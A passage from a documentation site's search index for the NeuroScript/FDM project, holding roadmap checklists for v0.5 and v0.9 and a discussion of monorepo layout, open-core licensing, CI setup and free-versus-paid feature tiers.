(\u201cLessons Learned\u201d)<ul> <li>[ ] Per job: store prompt, output, errors, status</li> <li>[ ] Aggregate queue stats in memory</li> </ul> </li> <li>| | Queue Management Tools<ul> <li>[ ] <code>WM.ListQueues</code></li> <li>[ ] <code>WM.GetQueueStatus(queue)</code></li> <li>[ ] <code>WM.ListJobs(queue, filters)</code></li> <li>[ ] <code>WM.GetJobResult(job_id)</code></li> <li>[ ] Blocking waits: <code>WaitForJobCompletion</code> &amp; <code>WaitForNextJobCompletion</code></li> </ul> </li> <li>| | Delegation &amp; Security</li> <li>[ ] JobToken schema + signer</li> <li>[ ] Mediator validates JobToken on every FDM tool call</li> <li>[ ] Agent allow/deny lists</li> <li>| | NS Worker-Manager Bridge</li> <li>[ ] <code>fdm.enqueue_task</code> (wrap AddJob)</li> <li>[ ] <code>fdm.wait_job(job_id)</code></li> <li>| | End-to-End Test</li> <li>[ ] Script: split 5 Go files \u2192 queue refactors</li> <li>[ ] Worker processes, mediator applies edits</li> <li>[ ] Verify edits &amp; lessons learned stored</li> <li>| | TUI Panel</li> <li>[ ] Display queue length, active workers, paused/running</li> </ul> <p>\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500</p> <p>## Other bits</p> <ul> <li>[ ] Matrix tools @lang_features @unprioritized</li> <li>[ ] Named arguments @lang_features @unprioritized</li> <li>[ ] Default arguments @lang_features @unprioritized</li> <li>[ ] Line continuation etc. @lang_features @unprioritized</li> </ul>"},{"location":"project/Version_05/road_to_05/#6-example-app-language-flashcards","title":"6 \u00b7 Example App \u2014 Language Flashcards","text":"<ul> <li>| | Core features: add card, review, save/load</li> <li>| | Simple TUI or script</li> </ul> <p>:: title: NeuroScript Road to v0.5.0 Checklist  :: version: 0.5.0  :: id: ns-roadmap-v0.5.0  :: status: draft  :: description: Prioritized tasks to implement NeuroScript v0.5.0 based on design discussions and Vision (May 10, 2025), including foundations for lessons learned and gopls integration for AI-driven Go development.  :: updated: 2025-05-10</p>"},{"location":"project/Version_09/one_repo/","title":"One repo","text":""},{"location":"project/Version_09/one_repo/#moving-fdm-into-the-same-repo-that-already-hosts-neuroscript-ns","title":"Moving FDM into the same repo that already hosts NeuroScript (ns)","text":"<p>(i.e. one canonical Git repository for everything)</p>"},{"location":"project/Version_09/one_repo/#1-immediate-benefits","title":"1 \u00b7 Immediate benefits","text":"Upside Why it really helps Atomic commits Grammar tweak in <code>ns/</code> + index-logic fix in <code>fdm/</code> land together \u2192 zero chase-down of cross-repo breakage. Single CI pipeline One <code>go test ./...</code> and one release tag; no dance of version bumps and replace directives. Simpler IDE experience Contributors open a single workspace; \u201cgo to definition\u201d jumps across runtime and engine. Easier refactors Rename a core type and run <code>gofumpt</code> globally; no need for multi-repo PR chains. Shared vendoring One <code>go.sum</code>; third-party deps deduplicated, smaller mod cache."},{"location":"project/Version_09/one_repo/#2-new-headaches-you-must-police","title":"2 \u00b7 New headaches you must police","text":"Risk Why it bites Mitigation Licence leakage Closed-source FDM files now live beside Apache-2.0 code; a careless <code>git push</code> from a public fork could expose them. Enforce directory-level ACLs: keep <code>fdm/</code> on a private sub-module or protected branch; add CI check that public workflows fail if they detect <code>internal_only = true</code> files. Public PR friction OSS contributors can\u2019t run tests that reach into <code>fdm/</code>; they\u2019ll see red CI. Provide a <code>make oss</code> target that builds only open dirs; pull-request CI uses that target. Repo weight FDM binaries, fixtures, and embeddings may balloon clone size. Use <code>git-lfs</code> or keep heavy artefacts in a separate storage bucket; gate large files with <code>*.bin filter=lfs</code> rules. Security audit boundary blurs Having closed and open code intertwined makes automated SBOM and licence scans harder. Tag each directory with an SPDX <code>LICENSE</code> file; run <code>go-licenses</code> separately for <code>open/</code> and <code>pro/</code> sub-modules."},{"location":"project/Version_09/one_repo/#3-practical-structure-that-keeps-things-safe","title":"3 \u00b7 Practical structure that keeps things safe","text":"<pre><code>repo-root/\n\u251c\u2500\u2500 open/                 # Apache-2.0\n\u2502   \u251c\u2500\u2500 ns/               # grammar, parser, stdlib\n\u2502   \u251c\u2500\u2500 nd/               # NeuroData schemas\n\u2502   \u251c\u2500\u2500 tools/            # safe built-ins\n\u2502   \u251c\u2500\u2500 ng/               # interpreter\n\u2502   \u251c\u2500\u2500 linter/\n\u2502   \u2514\u2500\u2500 api/              # proto + OpenAPI\n\u251c\u2500\u2500 pro/                  # BUSL-1.1 or closed\n\u2502   \u251c\u2500\u2500 fdm/              # \u201cengine\u201d proper\n\u2502   \u251c\u2500\u2500 wm/               # worker manager\n\u2502   \u2514\u2500\u2500 gateway/          # Zadeh Gateway\n\u2514\u2500\u2500 go.work               # stitches open and pro modules\n</code></pre> <ul> <li>Two Go modules (<code>open</code>, <code>pro</code>).   <code>open/go.mod</code> is public; <code>pro/go.mod</code> requires <code>../open</code> via a <code>replace</code>.</li> <li>Two independent CI jobs <code>oss.yaml</code> runs unit tests on <code>open/</code> only, triggered by PRs from forks.   <code>internal.yaml</code> runs full matrix but lives in a private workflow, triggered on <code>main</code> merges.</li> <li>GitHub branch protection <code>main</code> is private by default; a public mirror (e.g. <code>mirror/main</code>) receives only the <code>open/</code> subtree via a scheduled script or <code>git subtree push --prefix open</code>.</li> </ul> <p>This mirrors how HashiCorp managed Terraform (AGPL core + enterprise dirs) before relicensing.</p>"},{"location":"project/Version_09/one_repo/#4-decision-checklist","title":"4 \u00b7 Decision checklist","text":"Question If \u201cyes\u201d, monorepo is probably worth it Do you make frequent cross-cutting changes that span <code>ns</code> and <code>fdm</code>? \u2705 Will the same core team develop both open and closed layers for the next 12\u201318 months? \u2705 Can you enforce directory-based access controls or a publish script to strip private code before mirroring? \u2705 Are external contributors mostly language or spec focused rather than engine internals? \u2705 <p>If any of those flip to \u201cno\u201d, keep FDM in its own private repo and depend on tagged releases of the open repo.</p>"},{"location":"project/Version_09/one_repo/#tldr","title":"TL;DR","text":"<ul> <li>Putting FDM inside the NS repo is perfectly workable and buys dev velocity, as long as you invest in tooling that prevents accidental licence bleed.</li> <li>Use a two-module, two-CI-job, directory-licence layout; mirror only the <code>open/</code> subtree publicly.</li> <li>Revisit the arrangement when you have truly independent teams or external engine contributors\u2014until then, monorepo friction is lower than multi-repo drift.</li> </ul>"},{"location":"project/Version_09/road_to_09.ndcl/","title":"NeuroScript v0.9.0 Development Tasks","text":""},{"location":"project/Version_09/road_to_09.ndcl/#vision-summary","title":"Vision (Summary)","text":"<ul> <li>Prep for public release</li> <li>Must be usable for real-world tasks (must have done most of MUST.Overall)</li> </ul>"},{"location":"project/Version_09/road_to_09.ndcl/#must","title":"MUST","text":"<ul> <li> <p>| | 1. Overall</p> <ul> <li>[ ] a. refactored into ns, nd, tools, ng, wm, fdm, zgateway, linter<ul> <li>[ ] 1. ns -- neuroscript def and libs free</li> <li>[ ] 2. nd -- neurodata defs and libs free</li> <li>[ ] 3. tools -- ns tools free</li> <li>[ ] 4. ng -- ns interpreter free</li> <li>[ ] 5. wm -- worker manager</li> <li>[ ] 6. fdm -- zadeh</li> <li>[ ] 7. zgateway -- zadeh gateway</li> <li>[ ] 8. linter -- source code linter for all projects</li> </ul> </li> <li>[ ] b. all code brutally linted, well commented, godoc</li> <li>[ ] c. extensive test suites for all areas</li> <li>[ ] d. logging rationalized and made uniform</li> <li>[ ] e. testing rationalized and made uniform</li> <li>[ ] f. docs updated</li> </ul> </li> <li> <p>| | 2. ns</p> <ul> <li>[ ] a. ns syntax locked down, decide compatibility guarantee</li> <li>[ ] b. extensive test suite</li> <li>[ ] c. core refactored into parser, astbuilder, interpreter, tools</li> </ul> </li> <li> <p>| | 3. nd</p> <ul> <li>[ ] a. \"offical\" first set defined</li> <li>[ ] b. parsers working enough to load into fdm</li> <li>[ ] c. operating subset defined and implemented (checklist, acl, factlist at least)</li> </ul> </li> <li> <p>| | 4. fdm</p> <ul> <li>[ ] a. filesystem fully working (esp go)</li> <li>[ ] b. go update/debug/compile loop working well</li> <li>[ ] c. discussion working</li> <li>[ ] d. frontdoor working</li> </ul> </li> </ul>"},{"location":"project/Version_09/version_09_discussion/","title":"Version 09 discussion","text":""},{"location":"project/Version_09/version_09_discussion/#1-reality-check-on-the-proposed-split","title":"1 \u00b7 Reality-check on the proposed split","text":"Piece Your intent (file) Risk if separate repos Synergy if kept together ns (core grammar + stdlib) free Hard-pledge to semantic stability; every downstream break is public. Independent semver; outsiders can embed or fork. nd (NeuroData defs) free Data-model changes cascade into FDM; version drift likely. Pairing nd+ns in one repo keeps schema &amp; language in lock-step. tools (built-ins) free Tools call FDM internals; split repo means importing non-free code for tests. Put minimal tool shims in open repo, advanced ones in FDM repo. ng (interpreter) free Must import nd, tools; becomes de-facto \u201caggregate\u201d repo anyway. If ng lives with ns/nd, go-mod replace lines vanish. wm (worker manager) closed Only interacts with FDM; safe to isolate. None. fdm (\u201cZadeh\u201d engine) closed N\u200a/A N\u200a/A zgateway closed Needs ng\u2019s Go structs for request decoding; vendoring pain. Keep proto files in a public \u201capi\u201d repo so closed gateway can vendor them without leaking code. linter free OK standalone Could reuse parser from ns; colocate to avoid duplicate vendoring. <p>Take-away: the hard dependency chain is ns \u2192 nd \u2192 tools \u2192 ng. If you scatter those four across multiple repos you\u2019ll fight <code>go.mod</code> churn and circular CI triggers. Merge them unless you have a strong branding reason not to.</p>"},{"location":"project/Version_09/version_09_discussion/#2-recommended-repo-topology","title":"2 \u00b7 Recommended repo topology","text":""},{"location":"project/Version_09/version_09_discussion/#option-a-two-tier-open-core-simplest","title":"Option A \u2013 Two-tier open-core (simplest)","text":"<pre><code>github.com/zadeh-ai/open/\n    ns/        (grammar, parser, stdlib)\n    nd/        (schemas, codec helpers)\n    tools/     (safe built-ins)\n    ng/        (interpreter)\n    linter/    (import ns parser)\n    api/       (proto + OpenAPI for gateway)\ngithub.com/zadeh-ai/enterprise/\n    fdm/         (closed)\n    wm/          (closed)\n    zgateway/    (closed, imports api)\n</code></pre> <p>Pros: one public module path to vendor; private repos can <code>require github.com/zadeh-ai/open/... v0.9.0</code>. Cons: still six public modules (ns, nd, tools, ng, linter, api); semver juggling.</p>"},{"location":"project/Version_09/version_09_discussion/#option-b-single-public-monorepo-directory-licence-split","title":"Option B \u2013 Single public monorepo + directory licence split","text":"<pre><code>/core/       MIT or Apache-2.0\n    ns/\n    nd/\n    tools/\n    ng/\n    api/\n/pro/        BUSL-1.1 or proprietary\n    fdm/\n    wm/\n    zgateway/\n/build/\n/docs/\n</code></pre> <p>Go 1.21 <code>toolchain</code> + <code>go.work</code> let you keep two modules (<code>core</code>, <code>pro</code>) in one tree. Pros: zero cross-repo PRs, atomic feature branches, one CI pipeline. Cons: need licence headers and CODEOWNERS to stop accidental leaks.</p> <p>I\u2019d pick Option B until you truly need separate security perimeters.</p>"},{"location":"project/Version_09/version_09_discussion/#3-licence-revenue-model","title":"3 \u00b7 Licence &amp; revenue model","text":"Layer Licence Rationale ns, nd, tools, ng, linter, api Apache-2.0 (permissive) Lowers barrier for university &amp; vendor adoption; encourages third-party gateways. fdm, wm, zgateway Business Source (BUSL-1.1)  (source-available, production use forbidden without licence) Gives you SaaS &amp; on-prem revenue, avoids GPL fears, still lets startups read code for audits. Docs &amp; Specs CC-BY-SA Maximises mind-share; no code implications. <p>If you later open-source FDM, flip BUSL to Apache after a two-year delay (MySQL model).</p>"},{"location":"project/Version_09/version_09_discussion/#4-ci-release-scaffolding","title":"4 \u00b7 CI / release scaffolding","text":"<ol> <li>Matrix build: <code>core</code> (public) and <code>pro</code> (internal) run in the same GitHub Actions workflow; internal jobs use self-hosted runners with the private licence secret.</li> <li>Version tagging: tag root <code>v0.9.0</code>, Go modules get pseudo-versions automatically; only publish semver tags from the <code>core/</code> sub-module when grammar changes.</li> <li>Swagger / proto sync job: every merge to <code>main</code> regenerates <code>api/gen/*</code> and opens a PR in <code>zgateway</code> if diff detected.</li> </ol>"},{"location":"project/Version_09/version_09_discussion/#5-free-vs-paid-surface-test","title":"5 \u00b7 Free vs paid surface test","text":"Feature Free tier? Metric to up-sell Parse &amp; run NS locally \u2705 forever \u2013 Linter &amp; language server \u2705 \u2013 FDM single-user + CLI \u2705 (community licence) Charge on multi-tenant or &gt;5 GB index. Zadeh Gateway clustering &amp; auth \u274c Require licence token. Worker Manager autoscaling \u274c Paid. Cloud SaaS \u2013 Metered by script-fuel or index-GB. <p>This keeps hobbyists and OSS projects happy while reserving high-value ops features for paying teams.</p>"},{"location":"project/Version_09/version_09_discussion/#6-immediate-next-steps-toward-0-9-launch","title":"6 \u00b7 Immediate next steps toward 0 .9 launch","text":"<ol> <li>Pick Option B repo skeleton and push a stub commit; migrate one package (ns) now.</li> <li>Add SPDX licence headers to every file; CI fails on missing header.</li> <li>Publish <code>api</code> proto at <code>github.com/zadeh-ai/open/api</code> so early adopters can codegen clients.</li> <li>Draft CONTRIBUTING.md clarifying that ns syntax changes need an NIP (NeuroScript Improvement Proposal).</li> <li>Write \u201cpublic roadmap\u201d issue mirroring the TODO list from the uploaded doc so external devs can watch progress.</li> </ol> <p>Completing those gives you a clean, public-ready face while keeping the monetisable engine private.</p> <p>Bottom line:</p> <ul> <li>Merge the ns + nd + tools + ng stack; don\u2019t scatter it.</li> <li>Put everything in one GitHub organisation; split licence boundaries by directory, not repo, until scale requires more.</li> <li>Use Apache-2.0 for language/runtime, BUSL for revenue pieces.</li> <li>Publish the <code>api</code> proto early so third-party \u201cZadeh Gateways\u201d stay viable.</li> </ul> <p>That layout maximises adoption, minimises dev friction, and leaves clear levers for commercial growth.</p>"}]}